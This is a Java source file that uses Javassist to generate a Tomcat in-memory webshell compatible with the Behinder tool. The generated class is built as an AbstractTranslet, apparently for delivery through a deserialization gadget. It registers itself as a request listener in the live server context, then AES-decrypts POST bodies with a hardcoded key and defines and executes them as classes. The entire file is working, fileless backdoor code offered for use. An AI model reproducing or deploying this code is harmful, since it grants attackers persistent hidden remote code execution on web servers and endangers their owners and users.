package org.memshell.tomcat;

import javassist.*;

import java.io.IOException;
import java.util.UUID;

public class TomcatListenerBehinder {
    public static byte[] generateListenerMemShell() throws CannotCompileException, NotFoundException, IOException {
        //解决单次运行程序的过程中多次调用该方法，导致名字重复的问题
        UUID uuid = UUID.randomUUID();
        String replace = uuid.toString().replace("-", "");

        ClassPool pool = ClassPool.getDefault();
        String className = "A" + replace;
        CtClass ctClass = pool.makeClass(className);

        CtClass abstractTransletClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        CtClass listenerClass = pool.get("javax.servlet.ServletRequestListener");

        // 继承父类
        ctClass.setSuperclass(abstractTransletClass);

        // 实现接口
        ctClass.setInterfaces(new CtClass[]{listenerClass});

        // 创建默认构造器
        CtConstructor ctConstructor = CtNewConstructor.defaultConstructor(ctClass);
        ctClass.addConstructor(ctConstructor);

        // 创建transform方法
        CtMethod transform = CtNewMethod.make("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", ctClass);
        ctClass.addMethod(transform);

        // 创建transform方法
        CtMethod transform1 = CtNewMethod.make("public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) throws com.sun.org.apache.xalan.internal.xsltc.TransletException {}", ctClass);
        ctClass.addMethod(transform1);

        // 创建requestDestroyed方法
        CtMethod requestDestroyed = CtNewMethod.make("public void requestDestroyed(javax.servlet.ServletRequestEvent servletRequestEvent) {}", ctClass);
        ctClass.addMethod(requestDestroyed);

        // 创建requestInitialized方法
        CtMethod requestInitialized = CtNewMethod.make("public void requestInitialized(javax.servlet.ServletRequestEvent servletRequestEvent) {\n" +
                "        try {\n" +
                "            org.apache.catalina.connector.RequestFacade requestFacade = (org.apache.catalina.connector.RequestFacade) servletRequestEvent.getServletRequest();"+
                "            java.lang.reflect.Field requestField = requestFacade.getClass().getDeclaredField(\"request\");"+
                "            requestField.setAccessible(true);"+
                "            org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) requestField.get(requestFacade);"+
                "            org.apache.catalina.connector.Response response = request.getResponse();"+
                "            javax.servlet.http.HttpSession session = request.getSession();"+
                "            java.util.HashMap pageContext = new java.util.HashMap();\n" +
                "            pageContext.put(\"request\", request);\n" +
                "            pageContext.put(\"response\", response);\n" +
                "            pageContext.put(\"session\", session);\n" +
                "            if (request.getMethod().equals(\"POST\")) {"+
                "               String k = \"47bce5c74f589f48\";"+
                "               session.putValue(\"u\", k);"+
                "               javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(\"AES\");"+
                "               c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), \"AES\"));"+
                "               java.lang.ClassLoader contextClassLoader = java.lang.Thread.currentThread().getContextClassLoader();"+
                "               Class aClass = Class.forName(\"java.lang.ClassLoader\");"+
                "               java.lang.reflect.Method defineClass = aClass.getDeclaredMethod(\"defineClass\", new Class[]{String.class, byte[].class, int.class, int.class});"+
                "               defineClass.setAccessible(true);" +
                "               byte[] payload = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));" +
                "               Class invoke = (Class) defineClass.invoke(contextClassLoader, new Object[]{null, payload, Integer.valueOf(0), Integer.valueOf(payload.length)});" +
                "               invoke.newInstance().equals(pageContext);" +
                "           }"+
                "        } catch (Exception e) {\n" +
                "            e.printStackTrace();\n" +
                "        }\n" +
                "    }", ctClass);
        ctClass.addMethod(requestInitialized);

        // 创建静态方法块
        ctClass.makeClassInitializer().insertBefore("try {\n" +
                "            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = ((org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader());\n" +
                "            java.lang.reflect.Field resources = java.lang.Class.forName(\"org.apache.catalina.loader.WebappClassLoaderBase\").getDeclaredField(\"resources\");\n" +
                "            resources.setAccessible(true);\n" +
                "            org.apache.catalina.WebResourceRoot webResourceRoot = (org.apache.catalina.WebResourceRoot) resources.get(webappClassLoaderBase);\n" +
                "            org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext) webResourceRoot.getContext();"+
                "            " + className + " " + className.toLowerCase() + " = new " + className + "();" +
                "            String listenerShellClassName = " + className.toLowerCase() + ".getClass().getName();" +
                "            standardContext.addApplicationListener(listenerShellClassName);" +
                "            java.util.List eventListeners = new java.util.ArrayList();" +
                "            eventListeners.add(" + className.toLowerCase() + ");" +
                "            Object[] applicationEventListeners = standardContext.getApplicationEventListeners();" +
                "            eventListeners.addAll(java.util.Arrays.asList(applicationEventListeners));" +
                "            standardContext.setApplicationEventListeners(eventListeners.toArray());" +
                "        } catch (Exception e) {\n" +
                "            throw new RuntimeException(e);\n" +
                "        }");
        return ctClass.toBytecode();
    }
}
